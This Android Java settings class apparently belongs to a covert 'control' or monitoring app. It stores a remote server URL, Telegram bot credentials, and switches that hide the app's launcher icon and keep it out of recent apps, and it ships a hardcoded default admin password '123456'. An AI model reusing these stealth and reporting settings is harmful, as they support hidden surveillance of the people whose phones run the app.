package com.example.control.utils;

import android.content.Context;
import android.content.SharedPreferences;

public class SettingsManager {
    private static final String PREFS_NAME = "ControlAppPreferences";
    
    // Preference keys
    private static final String KEY_SERVICE_ENABLED = "service_enabled";
    private static final String KEY_SERVER_URL = "server_url";
    private static final String KEY_TELEGRAM_BOT_TOKEN = "telegram_bot_token";
    private static final String KEY_TELEGRAM_CHAT_ID = "telegram_chat_id";
    private static final String KEY_APP_HIDING_ENABLED = "app_hiding_enabled";
    private static final String KEY_STEALTH_MODE_ENABLED = "stealth_mode_enabled";
    private static final String KEY_ADMIN_PASSWORD = "admin_password";
    
    // Default values
    private static final String DEFAULT_SERVER_URL = "https://workspace.a71991932.repl.co";
    private static final String DEFAULT_ADMIN_PASSWORD = "123456"; // Default password
    
    private SharedPreferences prefs;
    private Context context;
    
    public SettingsManager(Context context) {
        this.context = context;
        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        
        // Initialize default values if first run
        initializeDefaultValues();
    }
    
    /**
     * Initialize default values if this is the first run
     */
    private void initializeDefaultValues() {
        // Check if this is the first run by checking if service_enabled key exists
        if (!prefs.contains(KEY_SERVICE_ENABLED)) {
            // First run - set defaults
            SharedPreferences.Editor editor = prefs.edit();
            
            // Basic settings
            editor.putBoolean(KEY_SERVICE_ENABLED, false);
            editor.putString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
            
            // Security settings
            editor.putString(KEY_ADMIN_PASSWORD, DEFAULT_ADMIN_PASSWORD);
            editor.putBoolean(KEY_APP_HIDING_ENABLED, false);
            editor.putBoolean(KEY_STEALTH_MODE_ENABLED, false);
            
            // Telegram bot settings initialized to empty - will be set in setup
            editor.putString(KEY_TELEGRAM_BOT_TOKEN, "");
            editor.putString(KEY_TELEGRAM_CHAT_ID, "");
            
            // Apply all changes
            editor.apply();
        }
    }
    
    /**
     * Check if the monitoring service is enabled
     * 
     * @return true if service is enabled, false otherwise
     */
    public boolean isServiceEnabled() {
        return prefs.getBoolean(KEY_SERVICE_ENABLED, false);
    }
    
    /**
     * Set the monitoring service enabled status
     * 
     * @param enabled true to enable the service, false to disable
     */
    public void setServiceEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_SERVICE_ENABLED, enabled).apply();
    }
    
    /**
     * Get the server URL for API calls
     * 
     * @return The server URL
     */
    public String getServerUrl() {
        return prefs.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
    }
    
    /**
     * Set the server URL for API calls
     * 
     * @param url The new server URL
     */
    public void setServerUrl(String url) {
        prefs.edit().putString(KEY_SERVER_URL, url).apply();
    }
    
    /**
     * Get the Telegram bot token
     * 
     * @return The Telegram bot token
     */
    public String getTelegramBotToken() {
        return prefs.getString(KEY_TELEGRAM_BOT_TOKEN, "");
    }
    
    /**
     * Set the Telegram bot token
     * 
     * @param token The new bot token
     */
    public void setTelegramBotToken(String token) {
        prefs.edit().putString(KEY_TELEGRAM_BOT_TOKEN, token).apply();
    }
    
    /**
     * Get the Telegram chat ID
     * 
     * @return The Telegram chat ID
     */
    public String getTelegramChatId() {
        return prefs.getString(KEY_TELEGRAM_CHAT_ID, "");
    }
    
    /**
     * Set the Telegram chat ID
     * 
     * @param chatId The new chat ID
     */
    public void setTelegramChatId(String chatId) {
        prefs.edit().putString(KEY_TELEGRAM_CHAT_ID, chatId).apply();
    }
    
    /**
     * Check if app hiding is enabled
     * When enabled, the app icon will be hidden from the launcher
     * 
     * @return true if app hiding is enabled, false otherwise
     */
    public boolean isAppHidingEnabled() {
        return prefs.getBoolean(KEY_APP_HIDING_ENABLED, false);
    }
    
    /**
     * Set app hiding enabled status
     * 
     * @param enabled true to enable app hiding, false to disable
     */
    public void setAppHidingEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_APP_HIDING_ENABLED, enabled).apply();
    }
    
    /**
     * Check if stealth mode is enabled
     * When enabled, the app will not appear in recent apps list
     * 
     * @return true if stealth mode is enabled, false otherwise
     */
    public boolean isStealthModeEnabled() {
        return prefs.getBoolean(KEY_STEALTH_MODE_ENABLED, false);
    }
    
    /**
     * Set stealth mode enabled status
     * 
     * @param enabled true to enable stealth mode, false to disable
     */
    public void setStealthModeEnabled(boolean enabled) {
        prefs.edit().putBoolean(KEY_STEALTH_MODE_ENABLED, enabled).apply();
    }
    
    /**
     * Get the admin password for accessing settings
     * 
     * @return The admin password, or empty string if not set
     */
    public String getAdminPassword() {
        return prefs.getString(KEY_ADMIN_PASSWORD, "");
    }
    
    /**
     * Set the admin password for accessing settings
     * 
     * @param password The new admin password
     */
    public void setAdminPassword(String password) {
        prefs.edit().putString(KEY_ADMIN_PASSWORD, password).apply();
    }
    
    /**
     * Clear all saved settings
     */
    public void clearAllSettings() {
        prefs.edit().clear().apply();
    }
}
